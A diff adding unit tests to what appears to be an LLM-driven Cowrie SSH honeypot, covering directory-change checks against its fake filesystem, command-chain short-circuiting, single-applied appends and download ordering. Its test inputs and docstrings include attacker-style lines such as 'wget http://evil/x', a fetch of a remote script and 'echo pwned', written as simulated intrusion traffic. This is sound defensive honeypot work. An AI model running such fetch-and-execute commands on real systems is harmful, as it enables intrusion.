@@ -149,6 +149,8 @@ class TestFastpath(unittest.TestCase):
         self.proto.lineReceived(b"")
         self.assertEqual(len(self.stub.calls), 0)
 
+
+
     def test_clear_invokes_eraseDisplay(self):
         # FakeTransport doesn't implement cursorHome (the real Twisted
         # insults terminal does). Stub it so the fastpath can complete.
@@ -180,6 +182,108 @@ class TestFastpath(unittest.TestCase):
         except Exception:
             pass
         self.assertEqual(len(self.stub.calls), 0)
+
+
+class TestCdExistence(unittest.TestCase):
+    """`cd` used to accept any path, on the grounds that there is no real
+    filesystem behind us.
+
+    That was a one-command tell — the prompt rendered a directory no
+    listing would ever show — and it silently broke the chain semantics
+    `cmdchain` had just been written to provide: a `cd` that cannot fail
+    makes `cd /nope && wget http://evil/x` always fetch, and
+    `cd /nope || cd /tmp` never fall back.
+
+    The check runs against the VFS, the same model `ls` and `stat` render
+    from, so the three cannot contradict each other.
+    """
+
+    def tearDown(self) -> None:
+        for proto in getattr(self, "_protos", []):
+            try:
+                proto.setTimeout(None)
+            except Exception:
+                pass
+
+    def _session(self, **kw):
+        proto, tr, stub = _make_protocol(**kw)
+        self._protos = getattr(self, "_protos", [])
+        self._protos.append(proto)
+        return proto, tr, stub
+
+    def test_absent_path_fails_and_leaves_cwd_alone(self):
+        proto, tr, _ = self._session()
+        proto.lineReceived(b"cd /nonexistent")
+        self.assertEqual(proto.cwd, "/")
+        self.assertIn(b"No such file or directory", tr.value())
+
+    def test_modelled_directory_still_succeeds(self):
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"cd /etc/ssh")
+        self.assertEqual(proto.cwd, "/etc/ssh")
+
+    def test_unmodelled_parent_is_still_accepted(self):
+        """/var is not in the skeleton, so we never described its contents.
+        Silence about a path we never listed is not a contradiction —
+        claiming it is absent would be. This is what keeps the check from
+        regressing every plausible path off the honeypot."""
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"cd /var/log")
+        self.assertEqual(proto.cwd, "/var/log")
+
+    def test_a_file_is_not_a_directory(self):
+        proto, tr, _ = self._session()
+        proto.lineReceived(b"cd /etc/passwd")
+        self.assertEqual(proto.cwd, "/")
+        self.assertIn(b"Not a directory", tr.value())
+
+    def test_cd_agrees_with_ls_of_the_same_parent(self):
+        """The invariant that matters: anything `cd /etc/X` rejects must be
+        absent from `ls /etc`, and anything it accepts must be present."""
+        proto, tr, _ = self._session()
+        proto.lineReceived(b"ls /etc")
+        listing = tr.value().decode(errors="replace").split()
+        for name in ("ssh", "cron.d", "systemd"):
+            self.assertIn(name, listing, f"{name} vanished from ls /etc")
+            p2, _t2, _ = self._session()
+            p2.lineReceived(f"cd /etc/{name}".encode())
+            self.assertEqual(p2.cwd, f"/etc/{name}")
+        for name in ("apache2", "nginx"):
+            self.assertNotIn(name, listing)
+            p2, _t2, _ = self._session()
+            p2.lineReceived(f"cd /etc/{name}".encode())
+            self.assertEqual(p2.cwd, "/", f"cd /etc/{name} contradicted ls /etc")
+
+    # -- the chain semantics this restores --------------------------------
+
+    def test_failed_cd_short_circuits_and(self):
+        proto, tr, _ = self._session()
+        proto.lineReceived(b"cd /nope && echo REACHED")
+        self.assertNotIn(b"REACHED", tr.value())
+
+    def test_failed_cd_triggers_or_fallback(self):
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"cd /nope || cd /tmp")
+        self.assertEqual(proto.cwd, "/tmp")
+
+    def test_failed_cd_does_not_let_a_payload_fetch_through(self):
+        """`cd /nope && wget ...` on a real box never fetches."""
+        proto, _tr, _ = self._session()
+        seen: list[str] = []
+        proto._try_download_intercept = lambda c: (seen.append(c), True)[1]
+        proto.lineReceived(b"cd /nonexistent && wget http://example.com/x.sh")
+        self.assertEqual(seen, [], "fetch ran after a failed cd")
+
+    def test_error_wording_follows_the_persona_shell(self):
+        """busybox ash and bash word this differently, and the persona
+        already decides which shell the box runs."""
+        from cowrie.llm import persona as personamod
+
+        proto, tr, _ = self._session()
+        proto.persona = personamod.pick_persona("x", override="alpine_3_19")
+        proto.lineReceived(b"cd /nonexistent")
+        self.assertIn(b"can't cd to", tr.value())
+        self.assertNotIn(b"bash:", tr.value())
 
 
 # ----------------------------------------------------------------------
@@ -911,3 +1015,74 @@ class TestChainedCommands(unittest.TestCase):
         proto.lineReceived(b'echo "a && b"')
         # Handled somewhere sane; the point is it is treated as one command.
         self.assertLessEqual(len(stub.calls), 1)
+
+    # -- a segment's mutations are applied exactly once --------------------
+
+    def test_chained_append_is_not_double_applied(self):
+        """`_dispatch_local` applies a segment's mutations, then the
+        unhandled branch used to apply them again on the remainder — and
+        the parser reads only the head of a line, so the second call hit
+        the same segment. The file ended up holding "pwnedpwned".
+
+        Append is the only non-idempotent mutation kind, so it is the only
+        one that ever showed the double-apply — create/remove/cp/mv all
+        produce the same world the second time and hid it.
+        """
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"echo pwned >> /tmp/f && ls")
+        fact = proto.world.files.get("/tmp/f")
+        self.assertIsNotNone(fact, "the append never reached WorldState")
+        self.assertEqual(fact.content_snippet, "pwned")
+        self.assertEqual(fact.size_bytes, len(b"pwned"))
+
+    def test_unchained_append_still_applies(self):
+        """Guard against fixing the double-apply by dropping it entirely."""
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"echo pwned >> /tmp/f")
+        fact = proto.world.files.get("/tmp/f")
+        self.assertIsNotNone(fact)
+        self.assertEqual(fact.content_snippet, "pwned")
+
+    def test_repeated_appends_still_accumulate(self):
+        """The fix must not make append idempotent — two separate lines
+        are two real appends.
+        """
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"echo a >> /tmp/f")
+        proto.lineReceived(b"echo b >> /tmp/f")
+        self.assertEqual(proto.world.files["/tmp/f"].content_snippet, "ab")
+
+    # -- an async download must not race the rest of the chain -------------
+
+    def test_download_in_a_chain_takes_the_whole_remainder(self):
+        """The fetch is asynchronous and narrates from its own callback.
+        Handling it per-segment let a later segment render its output and
+        prompt first, with the narration and a second prompt behind it.
+
+        Intercepting on the remainder keeps the line in order and leaves
+        exactly one prompt, drawn by the narration.
+        """
+        proto, _tr, _ = self._session()
+        seen: list[str] = []
+        # Record the routing without starting a real fetch — it would
+        # resolve DNS and leave the trial reactor dirty.
+        proto._try_download_intercept = lambda c: (seen.append(c), True)[1]
+        proto.lineReceived(b"wget http://example.com/x.sh && ls /tmp")
+        self.assertEqual(seen, ["wget http://example.com/x.sh && ls /tmp"])
+
+    def test_no_prompt_is_drawn_while_a_chained_fetch_is_in_flight(self):
+        """A prompt before the narration is a visible tell: the attacker
+        sees their shell come back, then output arrives after it.
+        """
+        from twisted.internet import defer
+
+        from cowrie.llm import downloader as dlmod
+
+        # Never-firing Deferred: exercises the in-flight path with no
+        # network, and leaves the reactor clean.
+        self.patch(dlmod, "fetch", lambda *a, **k: defer.Deferred())
+        proto, tr, _ = self._session()
+        proto.lineReceived(b"cd /tmp && wget http://example.com/x.sh && id")
+        self.assertEqual(
+            tr.value().count(b"root@"), 0, "prompt drawn before the fetch resolved"
+        )
